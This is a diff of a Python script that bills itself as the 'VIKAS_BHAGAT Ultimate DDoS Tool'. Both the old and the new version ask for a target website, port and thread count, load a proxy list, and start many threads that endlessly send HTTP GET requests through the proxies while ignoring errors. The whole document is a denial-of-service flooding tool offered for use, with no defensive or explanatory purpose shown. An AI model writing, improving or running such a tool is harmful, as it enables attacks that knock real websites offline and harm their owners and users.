@@ -1,58 +1,48 @@
+# VIKAS_BHAGAT Ultimate DDoS Tool
+# Advanced Non-Stop Attack with 100K Proxy Support
 
 import threading
 import socket
 import random
 import time
-import sys
 
-print("""
-    #########################################################
-    #                                                       #
-    #             MADE BY :- VIKAS_BHAGAT🚩                  #
-    #        ULTRA FAST DDOS TOOL (10M+ THREADS)             #
-    #                                                       #
-    #########################################################
-""")
+print("\n=== MADE BY :- VIKAS_BHAGAT🚩 ===\n")
 
-# Configurations
-target = input("TARGET WEBSITE (WITHOUT https://) : ").strip()
-port = int(input("PORT [Default 80] : ") or 80)
-thread_count = int(input("NUMBER OF THREADS [Example: 5000] : "))
+# Target Details
+target = input("Target Website (without https://) : ")
+port = int(input("Port (default 80) : ") or 80)
+thread_count = int(input("Threads (Example 100000) : "))
 
-# Load proxies
-try:
-    proxies = open('proxies.txt', 'r').read().splitlines()
-except:
-    print('[-] proxies.txt file not found.')
-    sys.exit()
+# Load Proxy List
+with open("proxies.txt", "r") as f:
+    proxies = f.read().splitlines()
 
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
-    "Mozilla/5.0 (X11; Linux x86_64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
-]
-
+# Attack Function
 def attack():
     while True:
         try:
             proxy = random.choice(proxies)
-            ip, port_proxy = proxy.split(":")
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
-            sock.connect((ip, int(port_proxy)))
-            
-            req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: Keep-Alive\r\n\r\n"
-            sock.sendall(req.encode())
-            sock.close()
-            print(f"[+] Attack Sent From Proxy: {proxy}")
-        except Exception as e:
-            # Skip errors to continue attack
-            pass
+            ip, proxy_port = proxy.split(":")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((ip, int(proxy_port)))
 
-# Start threads
-for _ in range(thread_count):
-    threading.Thread(target=attack, daemon=True).start()
+            payload = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()
+            s.sendall(payload)
+            print(f"Attack sent from Proxy: {proxy}")
+            s.close()
+        except:
+            pass  # Ignore all errors to keep attack running
 
+# Start Threads
+for i in range(thread_count):
+    thread = threading.Thread(target=attack)
+    thread.daemon = True
+    thread.start()
+
+print("\n[!] Attack Started Successfully!")
+
+# Keep Running
 while True:
-    time.sleep(10)
+    time.sleep(1)
+    
